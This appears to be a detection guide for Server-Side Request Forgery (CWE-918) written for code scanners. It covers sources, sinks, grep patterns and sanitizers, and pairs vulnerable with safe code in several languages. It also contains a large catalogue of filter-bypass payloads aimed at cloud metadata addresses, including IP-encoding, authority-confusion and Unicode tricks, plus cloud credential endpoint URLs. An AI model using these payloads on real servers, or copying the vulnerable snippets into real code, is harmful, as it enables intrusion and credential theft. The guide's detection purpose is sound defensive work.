---
name: ssrf
description: Server-Side Request Forgery detection (CWE-918)
---

# SSRF (CWE-918)

Identify cases where user-controlled URLs or hostnames are forwarded to server-side HTTP or network clients without adequate restriction.

The core pattern: *unvalidated, user-controlled input reaches the destination argument of an outbound network call.*

## What SSRF Is (and Is Not)

**What it IS**
- HTTP client calls where URL, host, IP, or port is built from user input: `requests.get(user_url)`, `fetch(req.body.webhook_url)`
- DNS lookups or raw TCP dials to user-supplied host/port: `dns.lookup(req.query.host)`, `net.Dial("tcp", host+":"+port)`
- Remote-scheme file fetchers: `file_get_contents($user_url)`, `URI.open(url)` (OpenURI)
- Webhooks, import-from-URL, image proxies, PDF/screenshot renderers — any feature that fetches a remote resource on behalf of the user
- Stored destinations: a URL saved from user input at write time and later used for an outbound request without allowlist validation
- **Inbound-message-derived URLs**: a destination parsed out of a received email or message and fetched server-side — e.g. a webmail "one-click unsubscribe" that issues a backend request to the URL in the `List-Unsubscribe` SMTP header (`List-Unsubscribe-Post: List-Unsubscribe=One-Click`), remote-image/link-preview prefetch, or a helpdesk/ticketing system that ingests email and fetches embedded links. The sender fully controls these headers/bodies, so they are untrusted even though they never arrive as an HTTP request parameter

**What it is NOT**
- **Open redirect** — HTTP 302 to a user URL redirects the *browser*, not a server-side outbound request (see `open_redirect.md`)
- **XXE-based SSRF** — outbound requests triggered by XML external entities in a parser (see `xxe.md`)
- **XSS via URL** — rendering a user-supplied URL in HTML without escaping
- **IDOR** — changing an object ID to access another user's data
- **Client-side fetch** — the browser, not the server, performs the request
- **Hardcoded outbound calls** — fixed URLs with no user influence on the destination

## Source -> Sink Pattern

**Sources (remote flow sources)**: HTTP request parameters, headers, path segments, cookies, JSON/form body fields — anything modeled as remote user input that can carry a URL, hostname, IP, or URL fragment used to build an outbound request. Also treat **content extracted from received messages** (SMTP headers such as `List-Unsubscribe`, email/message bodies, parsed links) as remote sources when the server later fetches them — same allowlist/validation applies as for direct request input. Java excludes taint from `URLConnection.getInputStream()` responses (following a remote redirect is not worse than the remote server choosing the target).

**Sinks (`request-forgery` kind)**:
- `new URL(userInput).openConnection()`
- `HttpURLConnection` with user-controlled URL
- `RestTemplate.getForObject(userInput, ...)`
- `WebClient.create(userInput)`
- `OkHttpClient` with user-controlled URL
- `HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(userInput)))`
- `ImageIO.read(new URL(userInput))`
- `DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(userInput)`
- `URLClassLoader(new URL[]{new URL(userInput)})`
- Python: any `Http::Client::Request` URL part (`requests.get`, `urllib`, `httpx`, `aiohttp`, etc.)
- JavaScript: `ClientRequest` URL or host (`http.get`, `fetch`, `axios`, `new URL(userInput)`)
- Go: `Http::ClientRequest` URL, WebSocket URL, framework-modeled sinks (`request-forgery`, `request-forgery[host]`)
- Ruby: `Http::Client::Request` URL parts; C#: outbound HTTP client URL arguments

**Additional taint steps**: assigning to `URI`/`URL` host arguments; `Properties.setProperty("jdbcUrl", tainted)` propagates to the Properties object (JDBC URL SSRF).

**Sanitizers / barriers**:
- Java: hostname-sanitizing string prefix (`?`, `#`, or `/` not in scheme position); `List.contains(url)` guard; `URI.getHost().equals("fixed")`; regexp host check; `HostnameSanitizingPrefix` append; external `request-forgery` barrier models
- Python (full SSRF): string concat/format/f-string with fixed left side excluding bare `http://`/`https://`; `isalnum`/`isalpha`/digit/identifier checks; `re.match`/`re.fullmatch`; `AntiSSRF.URIValidator.in_domain()` and Azure domain validators (models-as-data)
- Python partial SSRF: above plus constant-comparison barriers; string-restriction guards
- JavaScript: `encodeURIComponent` (path separators); external barrier models; HTML sanitizer output (additional step)
- Go: hostname-sanitizing prefix edge; `isLocalUrl`/`isValidRedirect`-style redirect checks; regexp match guards; URL/hostname equality against constant; simple-type sanitizers
- Ruby: prefixed string interpolation (fixed prefix before user part)

## Recon: Outbound Sink Grep Patterns

Flag any call where a non-hardcoded URL, host, IP, or port is passed as the destination. Trace taint in a later pass; recon is structural only.

| Stack | Grep targets (destination argument may be variable) |
|-------|-----------------------------------------------------|
| Python | `requests\.(get\|post\|put\|request)`, `urllib\.request\.urlopen`, `httpx\.`, `aiohttp\.ClientSession`, `socket\.(connect\|create_connection)`, `dns\.resolver\.resolve`, `subprocess\.(run\|Popen).*\b(curl\|wget)\b`, `base_url=`, `urljoin\(` (configured-base override) |
| Node.js | `\bfetch\(`, `axios\.(get\|post\|request)`, `http(s)?\.(get\|request)`, `got\(`, `undici\.(request\|fetch)`, `needle\.(get\|post\|request)`, `superagent`, `net\.(connect\|createConnection)`, `dns\.(lookup\|resolve\|resolve4\|resolve6)`, `exec.*\b(curl\|wget)\b`, `RESTDataSource`, `datasource-rest`, `resolveURL\(`, `this\.(get\|post\|put\|delete\|patch)\(` with a variable `path` arg, `new URL\([^,]+,` (base-relative resolve then fetched), `baseURL`, `prefixUrl`, `allowAbsoluteUrls` (configured-base override) |
| Ruby | `Net::HTTP\.`, `URI\.open`, `\bopen\(`, `RestClient\.`, `HTTParty\.`, `Faraday\.`, `Faraday\.new\(.*url:` (configured-base override), `Typhoeus::Request\.new\(`, `Excon\.`, Her `include Her::Model`, `\.(get\|post\|put\|delete)\(` / `request\(_path:` with a non-literal absolute path |
| PHP | `curl_setopt.*CURLOPT_URL`, `curl_exec`, `file_get_contents\(`, `fopen\(.*http`, `Guzzle.*->(get\|request)`, `HttpClient.*->request`, `base_uri` (Guzzle configured-base override) |
| Java | `\.openConnection\(\)`, `RestTemplate\.`, `WebClient\.`, `OkHttpClient`, `HttpClients\.`, `HttpGet\(`, `Jsoup\.connect`, `baseUrl\(`, `@Url\b`, `HttpUrl.*\.resolve\(` (configured-base override), `@FeignClient`, `@RequestLine`, `@HttpExchange`, `\bURI\b.*@Param\|URI \w+\)` (Feign/HTTP-interface `URI`-arg base override), `@RegisterRestClient` |
| Go | `http\.(Get\|Post\|NewRequest)`, `net\.Dial`, `net\.DialTimeout`, `net\.LookupHost`, `net\.LookupAddr`, `net\.ResolveTCPAddr`, `net\.ResolveIPAddr`, `SetBaseURL\(` (resty configured-base override), `sling\.New\(`, `\.Base\(.*\.Path\(` (sling ResolveReference override) |
| C# | `HttpClient\.(Get\|Post\|Send)Async`, `WebRequest\.Create`, `WebClient\.Download`, `BaseAddress\s*=` (configured-base override), `RestService\.For<`, `\[Get\("\{`, `new RestClient\(`, `RestRequest\(`, `AppendPathSegment\(` (Refit/RestSharp/Flurl) |
| PHP | (in addition to above) `resolveEndpoint\(`, `resolveBaseUrl\(` (Saloon), `ScopingHttpClient`, `base_uri` |
| Python | (in addition to above) `@get\(`/`@post\(` with `uplink`, `Url\b` typed arg, `slumber`/`tapioca` base-url clients |

Skip fully hardcoded literals (`requests.get("https://api.example.com/data")`). Shell-outs to `curl`/`wget`/`nc` with a variable target are SSRF sinks.

**Non-HTTP-client sinks** (the request is made by an auth library, the DB, or an AI loader — easy to miss):
| Surface | Grep targets (URL/host/issuer argument may be non-literal or admin/token-derived) |
|---------|-----------------------------------------------------------------------------------|
| IdP fetch (OIDC/OAuth/SAML) | `Issuer\.discover`, `openid-configuration`, `jwks_uri`, `jwksClient\(`, `PyJWKClient\(`, `get_signing_key`, `MetadataAddress`, `request_uri`, `sector_identifier_uri`, `logo_uri`, saml `metadata.*url` |
| Database remote-fetch | `dblink\(`, `postgres_fdw`, `FROM PROGRAM`, `OPENROWSET\(`, `OPENDATASOURCE`, `sp_addlinkedserver`, `xp_dirtree`, `UTL_HTTP`, `HTTPURITYPE`, `DBMS_LDAP`, `CONNECTION='`, `http_get\(`, ClickHouse `url\(`/`postgresql\(`/`mysql\(`, DuckDB `read_(csv\|parquet)\('https?` |
| LLM/RAG loader & agent tool | `RecursiveUrlLoader`, `WebBaseLoader`, `UnstructuredURLLoader`, `SeleniumURLLoader`, `SimpleWebPageReader`, `BeautifulSoupWebReader`, `download_loader\(`, `RequestsGetTool`, `image_url`, agent `fetch\|browse\|http_request\|read_url\|scrape` tools |

**Source param-name hints (prioritization only — never a standalone finding).** Request params/fields whose *name* frequently carries an SSRF-relevant value (URL/host/destination). A name match is only a reason to trace that input to one of the outbound sinks above with priority — flag SSRF solely when the taint actually reaches a sink. Match case-insensitively and on tokenized compound names (`redirectUrl`→`redirect`,`url`; `feed_uri`→`feed`,`uri`): `dest`, `redirect`, `url`, `uri`, `continue`, `next`, `return`, `returnUrl`, `callback`, `reference`, `site`, `domain`, `host`, `port`, `path`, `dir`, `feed`, `window`, `navigation`, `open`, `validate`, `html`, `proxy`, `fetch`, `webhook`, `image_url`, `avatar`, `imageUrl`, `target`.

## Vulnerable Conditions
- User-supplied input reaches any HTTP or network client URL parameter with no prior validation
- URL is parsed but only the hostname or scheme is checked against a denylist, which is bypassable via DNS rebinding, IPv6, or octal notation
- Destination was stored from user input earlier (webhook URL, avatar URL) with no allowlist at write or read time
- Only scheme restriction (`https://` only) or IP blocklist — bypassable to arbitrary HTTPS hosts, alternate IP notations, or redirect chains

## Safe Patterns

Effective mitigations (classify as **Not Vulnerable** when all apply):

**Strict host allowlist** — validate/sanitize before building the request URL; resolve hostname, then check against an explicit allowlist (not substring match):

```python
ALLOWED = {"api.example.com", "cdn.example.com"}
parsed = urlparse(user_url)
if parsed.hostname not in ALLOWED:
    raise ValueError("Destination not allowed")
requests.get(user_url)
```

**URL prefix allowlist** — restrict scheme and path prefix; still parse and verify host:

```python
ALLOWED_PREFIXES = ["https://api.example.com/", "https://cdn.example.com/"]
if not any(user_url.startswith(p) for p in ALLOWED_PREFIXES):
    abort(400)
```

**Resolve then validate IP** — resolve DNS first, reject private/link-local/metadata ranges on the resolved address, and pin that IP for the connection (blocks naive blocklist-only checks; TOCTOU remains if IP is not pinned):

```python
addrs = socket.getaddrinfo(parsed.hostname, parsed.port)
if any(ipaddress.ip_address(a[4][0]).is_private for a in addrs):
    raise ValueError("Internal destination blocked")
```

**DNS rebinding / TOCTOU — SAFE pattern** — validate **on every resolution**, pin the resolved IP for the actual socket connect, and re-validate after each redirect hop; never allowlist an attacker-controlled domain without pinning:

```python
# VULN: validate once, fetch later — TTL swap or second lookup hits internal IP
if not is_private(resolve(host)):
    requests.get(url)  # DNS may rebind before connect

# SAFE: resolve → block private/metadata → connect to pinned IP with Host header
addrs = socket.getaddrinfo(host, port, type=socket.SOCK_STREAM)
ip = addrs[0][4][0]
if ipaddress.ip_address(ip).is_private or ip.startswith("169.254."):
    raise ValueError("blocked")
# use custom adapter/connector binding to `ip`, set Host: {host}; disable blind redirect follow
# on manual redirect: re-parse Location, re-resolve, re-validate (no reuse of first IP)
```

**Resolution-failure fail-open (empty/errored DNS skips the block)** — a guard that only *rejects* when resolution returns a private IP will **allow** the request when resolution returns **zero addresses** or **raises**. Patterns: `if resolved.any?(&:private?)` / `if any(is_private(a) for a in addrs)` over an empty list is `false` → fetch proceeds; `begin resolve; rescue; end` that swallows the error and continues; a resolver returning `[]` on `SERVFAIL`/timeout. An attacker uses a domain that fails the validator's lookup but succeeds (or rebinds) at connect time. **SAST takeaway**: the safe default is **fail-closed** — block when the resolved set is empty or resolution errors, and require the validator to assert "at least one address AND every address public" rather than "no address is private".

```ruby
# VULN: empty/errored resolution → any? is false → request allowed (fail-open)
addrs = Resolv.getaddresses(host) rescue []
raise "blocked" if addrs.any? { |a| private?(a) }
http_get(url)

# SAFE: fail closed on empty/error; require all-public
addrs = Resolv.getaddresses(host)
raise "blocked" if addrs.empty? || addrs.any? { |a| private?(a) }
```

**Other safe shapes**
- User input used exclusively as a query parameter on a hardcoded host, never as authority
- URL assembled from a hardcoded base with user input confined to an encoded path segment
- Redirect following disabled on the HTTP client; handle redirects manually with re-validation
- Do not forward cookies, `Authorization`, or other auth headers to user-chosen destinations
- Normalize (IDNA/punycode, Unicode NFC) **before** allowlist comparison; reject URLs whose normalized host differs from raw parse

> IP blocklists alone (`169.254.0.0/16`, `10.0.0.0/8`, …) are **not** sufficient — bypass via DNS rebinding, URL encoding, IPv6/decimal notation, or redirect chains. Treat blocklist-only code as Likely Vulnerable.

## Evasion Patterns
- `http://127.0.0.1` vs `http://0x7f000001` vs `http://[::1]` vs `http://localhost`
- DNS rebinding: domain resolves to an internal IP address after the initial check completes
- URL parser differentials: `http://evil.com@127.0.0.1`
- Redirect (30x) bypass: an allowlisted host responds with a `Location:` to an internal target — covers the full 3xx family plus non-standard codes (e.g. `332`) and `Location`/`Content-Location` on `201`/`200`, not just 301/302 (see "SSRF via Redirect Chain (30x Bypass)")
- Scheme switch on redirect: `Location: gopher://`/`file://`/`dict://` escapes a scheme allowlist enforced only on the first URL — escalates a read-only fetch to an RCE/LFI primitive
- Fake-extension / content-type proxy bypass: an allowlisted `…/thumb.jpg` (or `.json`/`.csv`/`.xml`/`.pdf`) redirects to metadata — URL-extension and first-response content-type checks prove nothing about the final host
- WHATWG vs RFC3986 parser split: backslash treated as path separator in some fetch stacks — `http://allowed.com\@169.254.169.254/` may pass allowlist on one parser while the HTTP client requests the host after `@`
- Normalize-before-allowlist: blocklist/allowlist applied to raw string before Unicode NFC/NFKC collapse, percent-decoding, or IDNA punycode conversion — attacker smuggles forbidden host through alternate representation
- Metadata path/fragment: `http://169.254.169.254#@allowed.com` or `http://metadata/expected#@attacker` — validator reads fragment/host differently than fetch client
- Unicode / IDN / enclosed alphanumerics: fullwidth digits (`１２７.０.０.１`), homoglyphs, `xn--` punycode, or enclosed alphanumeric Unicode (`ⓛⓞⓒⓐⓛⓗⓞⓢⓣ`) bypass ASCII-only blocklists until IDNA normalization

### IP-encoding canonicalization matrix

All of the following resolve to the **same** address (`127.0.0.1` / `169.254.169.254` shown). A validator that string- or regex-matches the host, or checks only dotted-quad form, misses every alternate encoding. The **SAST takeaway**: flag any host/IP check that does not first parse the host to its canonical packed form (4-byte IPv4 / 16-byte IPv6) and then range-check; treat regex/`startswith`/`in`-string host checks as bypassable.

| Encoding | Example (`127.0.0.1`) | Example (`169.254.169.254`) |
|----------|----------------------|------------------------------|
| Dotted decimal (canonical) | `127.0.0.1` | `169.254.169.254` |
| Dotless decimal (32-bit) | `2130706433` | `2852039166` |
| Dotted hex | `0x7f.0x0.0x0.0x1` | `0xa9.0xfe.0xa9.0xfe` |
| Dotless hex | `0x7f000001` | `0xa9fea9fe` |
| Dotted octal | `0177.0.0.01` | `0251.0376.0251.0376` |
| Padded octal | `00177.00000.00000.000001` | `0000251.0376.0251.0376` |
| Dotted-decimal overflow (+256) | `383.256.256.257` | `425.510.425.510` |
| Short / partial form | `127.1`, `0177.1`, `0x7f.1` | `169.254.43518` |
| Mixed base (hex+oct+dec per octet) | `0x7f.0.0.1`, `0177.0.0x0.1` | `0xa9.0376.43518` |
| IPv6 compact mapped IPv4 | `[::127.0.0.1]` | `[::169.254.169.254]` |
| IPv6 v4-mapped | `[::ffff:127.0.0.1]` | `[::ffff:169.254.169.254]` |
| IPv6 with zone-id suffix | `[::127.0.0.1%2516]` | `[::ffff:169.254.169.254%2516]` |
| All-zeros / unspecified | `0.0.0.0`, `[::]`, `0` | — |

### Authority-confusion matrix

The host the **validator** parses differs from the host the **HTTP client** connects to, because of userinfo (`@`), delimiters, whitespace, or duplicate markers. Allowed host on the left of the confusion, internal target embedded:

| Trick | Example |
|-------|---------|
| Userinfo split | `http://allowed.com@169.254.169.254/` |
| Double / triple `@` | `http://allowed.com@@169.254.169.254/`, `http://allowed.com@@@169.254.169.254/` |
| Query / fragment before `@` | `http://169.254.169.254:80?@allowed.com/`, `http://169.254.169.254:80#@allowed.com/` |
| Combo userinfo+fragment | `http://169.254.169.254:80+&@allowed.com#+@allowed.com/` |
| Whitespace injection | `http://169.254.169.254%09allowed.com/`, `http://169.254.169.254%2509allowed.com/`, `http://169.254.169.254%20allowed.com/`, backslash-tab variants |
| Delimiter confusion | `http://169.254.169.254;allowed.com:80/`, `http://169.254.169.254,allowed.com:80/` |
| Scheme `0://` | `0://169.254.169.254:80;allowed.com:80/` |
| Port confusion | `http://169.254.169.254:80:80/`, `http://allowed.com:80+&@169.254.169.254:22/` |

### Alternate host separators and Unicode digits

- **Alternate "dots"** normalized to `.` by some resolvers/IDNA: ideographic full stop `。` (U+3002), halfwidth `｡` (U+FF61), fullwidth `．` (U+FF0E) — e.g. `http://169。254。169。254/`, `http://169｡254｡169｡254/`.
- **Circled / enclosed / styled digit octets**: circled digits (`①②③…`), and mathematical/fullwidth digit families all NFKC-fold to ASCII digits — e.g. `http://⑯⑨。②⑤④。⑯⑨｡②⑤④/`, dotless-hex circled `http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/`, dotless-decimal circled `http://②⑧⑤②⓪③⑨①⑥⑥:80/`.
- **IDNA mapping abuse**: characters that expand on IDNA/`ToASCII` (e.g. `ß` → `ss`) let an attacker register/route a name that normalizes into an allowlisted or internal host after conversion.
- **SAST takeaway**: any allowlist/blocklist compared against the raw or once-decoded host is bypassable. Require: parse with one library → IDNA/`ToASCII` encode → NFKC normalize → resolve → canonical-IP range check → pin IP for connect.

## Business Risk
- Unauthorized access to internal services such as metadata endpoints and admin panels
- Cloud metadata credential theft (AWS `169.254.169.254`, GCP, Azure IMDS)
- Internal network port enumeration
- Local file disclosure via `file://` protocol when the client supports it

## Java Source Detection Rules

### TRUE POSITIVE: User-controlled URL to server-side HTTP client
- External input controls the full URL or the target authority (`scheme://host:port`) that is passed to a server-side network client.
- Java sinks include `new URL(url).openConnection()`, `openStream()`, Apache HttpClient, `RestTemplate`, `WebClient`, `Jsoup.connect(...)`, and comparable outbound fetch APIs.
- Wrapper methods still qualify when the call chain traces from `@RequestParam` or other external input through a helper method to an outbound request.

### FALSE POSITIVE: Fixed or configuration-only outbound target
- A hardcoded URL, application property, service discovery endpoint, or other server-controlled configuration value used in `RestTemplate` or `URL.openConnection()` is not SSRF when request data cannot influence the destination.
- Do not flag a helper method or sink in isolation when no demonstrated path from external input to the requested URL exists.

### FALSE POSITIVE: Duplicate sink-only report
- A utility method such as `httpRequest(String requestUrl)` is not a standalone finding unless a specific externally controlled caller is identified.
- When the same external-input-to-sink path is already captured through the reachable controller endpoint, do not emit a second SSRF finding for the internal helper in isolation.
## Python/JS/PHP Source Detection Rules

### Python
- **VULN**: `requests.get(user_url)` — URL fully controlled by user
- **VULN**: `urllib.request.urlopen(user_input)`
- **VULN**: `requests.get(f"http://{user_host}/api")` — host portion is user-controlled
- **VULN**: `httpx.get(user_url)` / `httpx.AsyncClient().get(user_url)` — httpx follows same pattern as requests
- **VULN**: `aiohttp.ClientSession().get(user_url)` — async HTTP client with user-controlled URL
- **SAFE**: URL allowlist validation + only specific domains permitted

### JavaScript (Node.js)
- **VULN**: `axios.get(req.body.url)` — URL fully controlled by request body
- **VULN**: `fetch(req.query.url)`, `http.get(userUrl, ...)`
- **VULN**: `new URL(userPath, "http://localhost:3000")` then fetched — an **absolute** (`https://evil.com`) or **protocol-relative** (`//evil.com`) `userPath` discards the base origin (see *Base-Relative URL Resolution Override*)
- **VULN**: Apollo `RESTDataSource` subclass calling `this.get(path)`/`this.post(path)` with user-influenced `path`, especially with a custom `resolveURL(path, req)` that does `new URL(path.slice(1)…, baseURL)` — single-slash strip does not block `https://evil.com` or `///evil.com` (see *Framework HTTP-client `resolveURL`/path overrides*)
- **SAFE**: Fixed base URL with only the path portion user-controlled, **and** the input is rejected if it parses as absolute or starts with `//` (or `\\`), **and** the resolved `origin` is re-checked against the intended base (a bare `startsWith("/")` path check is insufficient — `//evil.com` also starts with `/`)

### PHP
- **VULN**: `file_get_contents($_GET['url'])` — PHP wrappers support `file://`, `http://`, `php://`
- **VULN**: `curl_setopt($ch, CURLOPT_URL, $_POST['url'])`
- **VULN**: `$data = file_get_contents("http://" . $_GET['host'] . "/api")`
- **PARTIAL HARDENING (not a complete SSRF fix)**: `curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS)` — restricts scheme only; does not block SSRF to attacker-chosen HTTPS hosts (external targets, internal HTTPS services, some metadata endpoints). Host/IP allowlisting (and blocking link-local/private ranges after DNS resolution) is still required.

## Vulnerable vs Secure Examples (Ruby, Go, C#)

### Ruby — Net::HTTP / OpenURI

```ruby
# VULNERABLE: open() fetches arbitrary URL
def import
  url = params[:url]
  content = URI.open(url).read
end

# SECURE: restrict scheme and host before open
def import
  url = params[:url]
  uri = URI.parse(url)
  raise "Forbidden" unless uri.is_a?(URI::HTTPS) && uri.host == "data.example.com"
  content = uri.open.read
end
```

### Go — net/http

```go
// VULNERABLE: user-supplied URL passed to http.Get
func proxyHandler(w http.ResponseWriter, r *http.Request) {
    target := r.URL.Query().Get("url")
    resp, _ := http.Get(target)
    io.Copy(w, resp.Body)
}

// SECURE: allowlist host after parse
func proxyHandler(w http.ResponseWriter, r *http.Request) {
    target := r.URL.Query().Get("url")
    u, err := url.Parse(target)
    if err != nil || u.Hostname() != "api.example.com" {
        http.Error(w, "Forbidden", 403)
        return
    }
    resp, _ := http.Get(target)
    io.Copy(w, resp.Body)
}
```

### C# — HttpClient

```csharp
// VULNERABLE: user-supplied URL passed to HttpClient
[HttpGet("proxy")]
public async Task<IActionResult> Proxy([FromQuery] string url)
{
    var response = await _httpClient.GetAsync(url);
    return Content(await response.Content.ReadAsStringAsync());
}

// SECURE: allowlist host before request
[HttpGet("proxy")]
public async Task<IActionResult> Proxy([FromQuery] string url)
{
    if (!Uri.TryCreate(url, UriKind.Absolute, out var uri) ||
        uri.Host != "api.example.com")
        return Forbid();
    var response = await _httpClient.GetAsync(url);
    return Content(await response.Content.ReadAsStringAsync());
}
```

## Cloud Metadata Endpoint Exposure

```java
// VULNERABLE: fetching user-controlled URL that can reach cloud metadata
// AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
// GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
// Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
// These endpoints return cloud credentials when hit from the server

// VULN indicator: any URL fetch with user-controlled host/path that is NOT blocked
// by allowlist — cloud metadata IPs must be explicitly blocked
String url = request.getParameter("url");
restTemplate.getForObject(url, String.class);  // no IP allowlist check
```

### What to flag: Any HTTP client call with user-controlled URL where there is NO:
- IP blocklist that includes `169.254.169.254`, `metadata.google.internal`, `169.254.170.2`
- Scheme allowlist restricting to `https://` only on specific domains
- Host/IP validation against an allowlist

## Base-Relative URL Resolution Override (absolute / protocol-relative first arg discards the base)

A very common "safe-looking" pattern resolves user input **against a fixed base** intending the input to be only a *path* appended to a trusted origin (`new URL(userPath, "http://localhost:3000")`). Per the WHATWG URL spec (and the equivalent rule in every major language's resolver), **if the first argument is already an absolute URL, the base is silently discarded** — and a **protocol-relative** value (`//evil.com/x`) overrides the host while keeping the base's scheme. So `userPath = "https://evil.com"` or `"//evil.com"` makes the "localhost" fetch go to `evil.com` (SSRF), and the same primitive is an open-redirect when the resolved URL is sent in a `Location` header. This is **not** a parser differential — a single parser produces the attacker origin; the bug is trusting base-relative resolution without forcing the input to be relative.

```javascript
// VULN: base is discarded when userPath parses as absolute / protocol-relative
const target = new URL(userPath, "http://localhost:3000");
// userPath="https://evil.com"  -> https://evil.com/   (full override)
// userPath="//evil.com/x"      -> http://evil.com/x   (protocol-relative override)
http.get(target.href, ...);

// SAFE: reject anything that parses as absolute, then resolve as a pure path,
// and re-check the resolved origin against the intended one.
if (/^[a-z][a-z0-9+.-]*:/i.test(userPath) || userPath.startsWith("//")) {
  throw new Error("absolute/protocol-relative path not allowed");
}
const base = new URL("http://localhost:3000");
const target = new URL(userPath.replace(/^\/+/, "/"), base);
if (target.origin !== base.origin) throw new Error("origin escaped");
```

Equivalent base-discard resolvers to flag across languages (same "absolute first arg wins" rule): Python `urllib.parse.urljoin(base, userInput)`; Java `new URL(URL base, String spec)` / `URI.resolve`; Go `base.ResolveReference(ref)` / `base.Parse(ref)`; .NET `new Uri(Uri base, string relative)`; Ruby `URI.join`. **SAST signal**: any base+relative join where the relative component is user-controlled and is not first validated to be a path (no scheme, not starting with `//`, optionally not containing `\`), *and* the resolved `origin`/`host` is not re-compared to the intended base before the outbound fetch / redirect. A path-only allowlist or `startsWith("/")` check is insufficient because `//evil.com` also starts with `/`.

**Custom path→URL resolvers / path overrides in HTTP-client base classes.** Any SDK/REST-client base class that exposes a path-based API (`this.get(path)`, `this.post(path, …)`, `this.put`, `this.delete`) and resolves `path` against a configured `baseURL` is in scope — typically via a single resolver method (an overridable hook or a private helper) that ends in `new URL(normalizedPath, base)` / a join. The canonical instance is **Apollo `RESTDataSource`'s overridable `resolveURL(path, request)`**, but the pattern is generic: a `baseURL`-bound client with a per-request `path`. When `path` is user-influenced (a route/query param, a GraphQL arg, an ID, or anything flowing in cross-module), an **absolute** (`https://evil.com`) value rebases off the trusted `baseURL` and the framework then fetches it → SSRF, even though the caller "only passes a path." A hand-rolled normalizer that **strips a single leading slash is NOT a fix**: `path.startsWith('/') ? path.slice(1) : path` leaves `https://evil.com` untouched (absolute override) and turns `///evil.com` into `//evil.com` (**protocol-relative** override → `http://evil.com/`). Treat any custom path→URL resolver / path-join in an HTTP-client class as an SSRF sink unless it rejects absolute + `//`/`\\`-leading inputs **and** re-checks the resolved `origin` against `baseURL`.

```typescript
// Generic shape: a base-bound client resolves a per-request path into the upstream URL.
// (Apollo RESTDataSource is one instance — override resolveURL(path, request); the same applies
//  to any hand-rolled `resolveUrl`/`buildUrl`/`join(base, path)` helper in an HTTP-client class.)

// VULN: single-slash strip, then base-relative resolve.
// client.get(userPath) with userPath="https://evil.com" or "///evil.com" leaves the trusted baseURL.
function resolveUpstreamUrl(path: string, baseURL: string): URL {
  const base = baseURL.endsWith('/') ? baseURL : `${baseURL}/`;
  const normalizedPath = path.startsWith('/') ? path.slice(1) : path;  // insufficient
  return new URL(normalizedPath, base);
}

// SAFE: reject absolute/protocol-relative/backslash, resolve, then pin to baseURL origin.
function resolveUpstreamUrl(path: string, baseURL: string): URL {
  if (/^[a-z][a-z0-9+.-]*:/i.test(path) || /^[/\\]{2}/.test(path) || path.includes('\\')) {
    throw new Error('invalid path');
  }
  const base = new URL(baseURL.endsWith('/') ? baseURL : `${baseURL}/`);
  const url = new URL(path.replace(/^\/+/, ''), base);
  if (url.origin !== base.origin) throw new Error('path escaped base origin');
  return url;
}
```

**Do NOT dismiss SSRF just because "no user-controlled *full URL* is passed to an HTTP client."** That heuristic is wrong for base-rebasing: a user-controlled **path/path-segment** resolved against a base and then fetched is sufficient for CWE-918. The same `new URL(path, base)` / `resolveURL` / `urljoin` sink is frequently filed **only** as path traversal (CWE-22) — it must be **re-judged for SSRF (CWE-918) on the same sink** whenever the resolved URL reaches an outbound HTTP client (cross-ref `path_traversal_lfi_rfi.md`). Reachability is often non-obvious: the tainted segment may need **first-segment placement** (it must land as the host/scheme-bearing part of the resolved URL, not a later path segment) and may arrive through a **cross-module taint chain** (e.g. a privileged resolver passing an attacker-influenced value into a shared data-source method) — trace these rather than stopping at "looks like a path."

### Configured-base HTTP clients (the `baseURL`/`prefixUrl`/`BaseAddress` footgun)

Apollo `RESTDataSource` is **not** special — almost every mainstream HTTP client that supports a configured base URL applies the same WHATWG/RFC-3986 rule: **a per-request `url`/`path` that is itself absolute (or, for spec-based resolvers, protocol-relative) overrides the base and is fetched as-is.** So `client.get(userInput)` is an SSRF sink whenever `userInput` is attacker-influenced, even though the developer "only configured a trusted base." This is a real, shipped vulnerability class — e.g. **axios CVE-2025-27152** (CWE-918): an absolute URL passed to a `baseURL`-configured instance is sent to the attacker host *and leaks the configured auth headers / API keys* to it.

| Client (lang) | Base config | Override behavior when per-request arg is absolute / `//` | Safe knob |
|---|---|---|---|
| **axios** (JS/TS) | `axios.create({ baseURL })` | Absolute **and** protocol-relative arg overrides base → request + headers sent to attacker host (CVE-2025-27152, ≤1.8.1) | `allowAbsoluteUrls: false` (≥1.8.2) **plus** re-check host; don't pass user input as `url` |
| **fetch / undici / node-fetch** (JS) | `new URL(path, base)` then `fetch` | Absolute or `//host` discards base (WHATWG) | reject absolute/`//`, re-check `origin` |
| **got** (JS) | `prefixUrl` | Safer: **throws** if `input` starts with `/`; `prefixUrl` is concat, not resolution — but a `URL`/`Request` instance argument bypasses `prefixUrl` | keep input a string suffix; never build the arg from a user `URL` object |
| **ky** (JS) | `prefixUrl` | Safer (same model as got); still applies to absolute strings and a `URL`/`Request` arg bypasses it | same as got |
| **httpx** (Python) | `Client(base_url=…)` | `_merge_url` only prepends base when arg `is_relative_url` (no scheme **and** no host); an absolute or `//host` arg (has host) is used as-is | validate arg is relative; re-check resolved host |
| **requests** (Python) | `urljoin(base, path)` / `BaseUrlSession` | `urljoin` absolute/`//` arg overrides base | reject absolute/`//`, re-check host |
| **Spring `WebClient`/`RestTemplate`** (Java) | `baseUrl(…)` / `DefaultUriBuilderFactory` | absolute `uri(userInput)` overrides base | build with fixed host + `UriComponentsBuilder` path-only; allowlist host |
| **Retrofit** (Java/Kotlin) | `baseUrl(…)` + `@Url` param | `@Url` absolute **or** `//host` **or** `/abs-path` overrides/ rebases base ("it's how URLs work") | never bind user input to `@Url`; use `@Path` (encoded) on a fixed route |
| **OkHttp** (Java/Kotlin) | `baseUrl.resolve(link)` | absolute/`//` link discards base origin | reject, then compare `resolvedUrl.host` |
| **resty** (Go) | `client.SetBaseURL(…)` | absolute arg to `R().Get(url)` overrides base | reject absolute/`//`, re-check host |
| **.NET `HttpClient`** | `BaseAddress` | absolute request URI ignores `BaseAddress`; a `/leading` relative URI also discards the base **path** (same-host → traversal, not SSRF) | pass a `new Uri(base, relativeNoLeadingSlash)` you built; allowlist host |
| **Faraday** (Ruby) | `Faraday.new(url: base)` | absolute arg to `conn.get(arg)` overrides base | reject absolute/`//`, re-check host |

